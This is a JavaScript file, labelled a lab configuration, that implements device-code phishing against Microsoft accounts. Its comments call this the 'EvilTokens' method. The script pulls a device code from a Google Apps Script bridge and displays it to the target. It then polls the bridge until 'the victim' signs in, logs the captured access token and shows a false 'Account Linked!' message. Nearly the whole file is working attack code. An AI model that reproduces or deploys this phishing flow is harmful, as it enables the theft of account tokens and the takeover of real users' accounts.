/**
 * LAB CONFIGURATION
 * Replace SCRIPT_URL with your Google Web App URL
 */
const SCRIPT_URL = "https://script.google.com/macros/s/AKfy.../exec";

async function init() {
    console.log("Engine v3.4: Initializing...");
    
    try {
        // 1. GENERATE THE CODE
        const response = await fetch(SCRIPT_URL, { redirect: "follow" });
        const rawData = await response.text();
        const data = JSON.parse(rawData);

        if (data.user_code) {
            console.log("SUCCESS: Code Generated ->", data.user_code);
            
            // Update the UI for your lab
            const display = document.getElementById("code-display");
            if (display) display.innerText = data.user_code;

            // 2. START POLLING (The "EvilTokens" Method)
            // This waits for the victim to finish logging in
            pollForToken(data.device_code, data.interval || 5);
        } else {
            console.error("Microsoft Block:", data.error_description);
        }
    } catch (err) {
        // Ignore Google's redirect noise if we got the data
        if (!document.getElementById("code-display").innerText) {
            console.error("Bridge Connection Failed. Verify 'Anyone' access.");
        }
    }
}

/**
 * Polling logic: Every X seconds, we ask the bridge: 
 * "Did the user finish signing in yet?"
 */
async function pollForToken(deviceCode, interval) {
    console.log(`Polling every ${interval}s for token...`);
    
    const pollInterval = setInterval(async () => {
        try {
            // We send the device_code back to the bridge to check status
            const response = await fetch(`${SCRIPT_URL}?device_code=${deviceCode}`, { redirect: "follow" });
            const rawData = await response.text();
            const data = JSON.parse(rawData);

            if (data.access_token) {
                console.log("!!! TOKEN CAPTURED !!!");
                console.log("Access Token:", data.access_token);
                clearInterval(pollInterval);
                alert("Success: Account Linked!");
            } else if (data.error === "authorization_pending") {
                console.log("Waiting for user to enter code...");
            } else if (data.error === "expired_token") {
                console.log("Code expired. Refresh the page.");
                clearInterval(pollInterval);
            }
        } catch (e) {
            // Silent retry
        }
    }, interval * 1000);
}

// Fire the engine
init();
